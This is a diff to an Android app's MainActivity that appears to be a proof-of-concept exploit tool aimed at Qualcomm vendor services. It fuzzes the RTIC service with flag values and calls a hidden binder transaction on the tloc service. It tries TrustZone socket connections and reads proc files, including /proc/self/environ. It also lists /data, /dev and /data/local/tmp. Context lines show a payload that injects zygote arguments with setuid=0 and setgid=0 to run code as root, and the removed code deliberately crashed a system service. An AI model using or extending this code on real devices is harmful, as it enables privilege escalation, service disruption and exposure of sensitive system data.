@@ -5,6 +5,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
+import android.net.LocalSocket;
+import android.net.LocalSocketAddress;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -185,7 +187,7 @@ public class MainActivity extends AppCompatActivity {
             IBinder rticBinder = getService("rtic");
             if (rticBinder != null) {
                 IRticService rtic = IRticService.Stub.asInterface(rticBinder);
-                crashRtic(rtic);
+                testRticFlags(rtic);
                 discoverMethods(rticBinder, "IRticService");
             }
             IBinder tlocBinder = getService("tloc");
@@ -193,6 +195,8 @@ public class MainActivity extends AppCompatActivity {
                 ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
                 testTloc(tloc);
                 discoverMethods(tlocBinder, "ITlocService");
+                // 追加: 隠しメソッド (code 2) のテスト
+                testTlocHiddenMethod(tlocBinder);
             }
         }
 
@@ -205,8 +209,8 @@ public class MainActivity extends AppCompatActivity {
             tryConnectViaTZ("/dev/socket/ssgqmig");
         }
 
-        appendLog("========== PHASE 4: File Read/Write ==========");
-        testFileReadWrite();
+        appendLog("========== PHASE 4: File System Exploration ==========");
+        exploreFiles();
 
         appendLog("========== PHASE 5: Settings Manipulation ==========");
         testSettingsWrite();
@@ -236,14 +240,27 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void crashRtic(IRticService rtic) {
-        appendLog("--- Causing RticService crash ---");
+    private void testRticFlags(IRticService rtic) {
+        appendLog("--- Testing RTIC with different flags ---");
+        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
+        for (long flag : flags) {
+            try {
+                int[] status = new int[1];
+                int[] ret = new int[1];
+                byte[] data = rtic.getRticData(flag, status, ret, false);
+                appendLog("Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
+            } catch (RemoteException e) {
+                appendLog("RemoteException for flag " + flag + ": " + e.getMessage());
+            }
+        }
+        // フォーマット指定
         try {
-            int[] status = new int[0];
-            int[] ret = new int[0];
-            rtic.getRticData(0, status, ret, false);
-        } catch (Exception e) {
-            appendLog("Crash: " + e.getClass().getSimpleName() + " - " + e.getMessage());
+            int[] status = new int[1];
+            int[] ret = new int[1];
+            byte[] data = rtic.getRticData(0, status, ret, true);
+            appendLog("z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
+        } catch (RemoteException e) {
+            appendLog("RemoteException: " + e.getMessage());
         }
     }
 
@@ -258,6 +275,38 @@ public class MainActivity extends AppCompatActivity {
             appendLog("tlocWarmUp returned: " + warmup);
         } catch (RemoteException e) {
             appendLog("RemoteException: " + e.getMessage());
+        }
+    }
+
+    private void testTlocHiddenMethod(IBinder binder) {
+        appendLog("--- Testing hidden method (code 2) of ITlocService ---");
+        Parcel data = Parcel.obtain();
+        Parcel reply = Parcel.obtain();
+        try {
+            data.writeInterfaceToken(binder.getInterfaceDescriptor());
+            // 適当なデータを書き込んでみる
+            data.writeInt(123);
+            data.writeString("test");
+            boolean success = binder.transact(2, data, reply, 0);
+            if (success) {
+                appendLog("Hidden method call succeeded, reply size=" + reply.dataSize());
+                reply.setDataPosition(0);
+                try {
+                    int result = reply.readInt();
+                    appendLog("  readInt: " + result);
+                } catch (Exception e) {}
+                try {
+                    String s = reply.readString();
+                    appendLog("  readString: " + s);
+                } catch (Exception e) {}
+            } else {
+                appendLog("Hidden method call failed");
+            }
+        } catch (Exception e) {
+            appendLog("Hidden method error: " + e.getMessage());
+        } finally {
+            data.recycle();
+            reply.recycle();
         }
     }
 
@@ -310,7 +359,7 @@ public class MainActivity extends AppCompatActivity {
                 payload.append("--runtime-args\n");
                 payload.append("--setuid=0\n");
                 payload.append("--setgid=0\n");
-                payload.append("--target-sdk-version=28\n");
+                payload.append("--target-sdk-version=29\n");
                 payload.append("--nice-name=root_" + pkg.replace(".", "_") + "\n");
                 payload.append("--app-data-dir=/data/data/" + pkg + "\n");
                 payload.append("--package-name=" + pkg + "\n");
@@ -338,6 +387,7 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
         try {
+            // IMinkSocketFd クラスを直接インポートして使う（AIDL がコンパイルされていれば）
             Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd");
             Method asInterface = cls.getMethod("asInterface", IBinder.class);
             Object proxy = asInterface.invoke(null, mTZServiceBinder);
@@ -350,41 +400,94 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 appendLog("  Failed to get FD for " + path);
             }
+        } catch (ClassNotFoundException e) {
+            appendLog("  IMinkSocketFd class not found. Ensure AIDL is included.");
         } catch (Exception e) {
             appendLog("  TZ connect error: " + e.getMessage());
         }
     }
 
-    private void testFileReadWrite() {
-        appendLog("--- File Read/Write ---");
-        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        if (download.exists() || download.mkdirs()) {
-            File testFile = new File(download, "poc_write_test.txt");
-            try (FileOutputStream fos = new FileOutputStream(testFile)) {
-                fos.write("PoC write test\n".getBytes(StandardCharsets.UTF_8));
-                appendLog("Write to " + testFile.getAbsolutePath() + " succeeded");
-            } catch (Exception e) {
-                appendLog("Write failed: " + e.getMessage());
-            }
-            try {
-                File status = new File("/proc/self/status");
-                if (status.exists()) {
-                    try (FileInputStream fis = new FileInputStream(status)) {
-                        byte[] buf = new byte[4096];
-                        int len = fis.read(buf);
-                        if (len > 0) {
-                            String content = new String(buf, 0, len, StandardCharsets.UTF_8);
-                            appendLog("Read /proc/self/status: " + content.substring(0, Math.min(200, content.length())));
-                        }
-                    }
-                } else {
-                    appendLog("/proc/self/status not found");
+    private void exploreFiles() {
+        appendLog("--- File System Exploration ---");
+        // 読み取り可能な proc ファイル
+        String[] procFiles = {
+            "/proc/self/status",
+            "/proc/self/stat",
+            "/proc/self/environ",
+            "/proc/mounts",
+            "/proc/net/dev",
+            "/proc/cmdline",
+            "/proc/version",
+            "/proc/uptime",
+            "/proc/loadavg",
+            "/proc/meminfo",
+            "/proc/cpuinfo"
+        };
+        for (String path : procFiles) {
+            if (stopRequested.get()) break;
+            readFileContent(path);
+        }
+
+        // /data ディレクトリの読み取り（通常はアクセスできないが試す）
+        File dataDir = new File("/data");
+        if (dataDir.exists() && dataDir.canRead()) {
+            appendLog("Can read /data/");
+            File[] children = dataDir.listFiles();
+            if (children != null) {
+                for (File f : children) {
+                    appendLog("  " + f.getName());
                 }
-            } catch (Exception e) {
-                appendLog("Read /proc/self/status failed: " + e.getMessage());
             }
         } else {
-            appendLog("Download dir not accessible");
+            appendLog("Cannot read /data/ (permission denied)");
+        }
+
+        // /dev ディレクトリ（通常は読み取り可能だがファイル一覧は取れない場合あり）
+        File devDir = new File("/dev");
+        if (devDir.exists() && devDir.canRead()) {
+            appendLog("Can read /dev/");
+            File[] children = devDir.listFiles();
+            if (children != null) {
+                for (File f : children) {
+                    appendLog("  " + f.getName());
+                }
+            }
+        } else {
+            appendLog("Cannot read /dev/");
+        }
+
+        // /data/local/tmp は書き込み可能か？
+        File tmpDir = new File("/data/local/tmp");
+        if (tmpDir.exists()) {
+            appendLog("tmp exists, canWrite=" + tmpDir.canWrite() + ", canRead=" + tmpDir.canRead());
+            File[] children = tmpDir.listFiles();
+            if (children != null) {
+                for (File f : children) {
+                    appendLog("  " + f.getName());
+                }
+            }
+        } else {
+            appendLog("/data/local/tmp not exists");
+        }
+    }
+
+    private void readFileContent(String path) {
+        File f = new File(path);
+        if (!f.exists() || !f.canRead()) {
+            appendLog("Cannot read " + path);
+            return;
+        }
+        try (FileInputStream fis = new FileInputStream(f)) {
+            byte[] data = new byte[4096];
+            int len = fis.read(data);
+            if (len > 0) {
+                String content = new String(data, 0, len, StandardCharsets.UTF_8);
+                appendLog("Content of " + path + ": " + content);
+            } else {
+                appendLog("Empty file: " + path);
+            }
+        } catch (Exception e) {
+            appendLog("Error reading " + path + ": " + e.getMessage());
         }
     }
 
